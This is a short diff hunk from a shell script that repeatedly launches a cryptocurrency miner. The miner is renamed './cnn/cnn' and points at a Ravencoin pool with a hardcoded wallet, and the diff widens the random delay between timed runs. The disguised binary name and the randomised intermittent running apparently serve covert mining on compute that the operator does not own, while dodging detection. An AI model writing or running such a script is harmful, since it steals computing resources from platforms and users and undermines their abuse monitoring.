@@ -9,7 +9,7 @@ do
 	b=800
 	c=$(($a+$b))
 
-	w=$(($RANDOM%60))
+	w=$(($RANDOM%200))
 	e=300
 	aaram=$(($w+$e))
 	timeout -k 5 $c\s   ./cnn/cnn -P stratums://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker@us.ravenminer.com:13802 -U --cu-grid-size 64 --cu-parallel-hash 1 --cu-block-size 256
